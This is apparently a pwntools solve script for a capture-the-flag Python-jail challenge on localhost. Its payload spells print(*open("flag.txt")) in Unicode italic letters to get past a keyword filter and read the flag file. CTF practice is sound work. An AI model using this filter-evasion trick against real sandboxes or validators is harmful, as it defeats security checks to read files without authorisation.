import pwn

HOST = 'localhost'
PORT = 4449

conn = pwn.remote(HOST, PORT)

payload = '𝘱𝘳𝘪𝘯𝘵(*𝘰𝘱𝘦𝘯("flag.txt"))'
conn.sendline(payload)

response = conn.recvall().decode()
print(response)

conn.close()
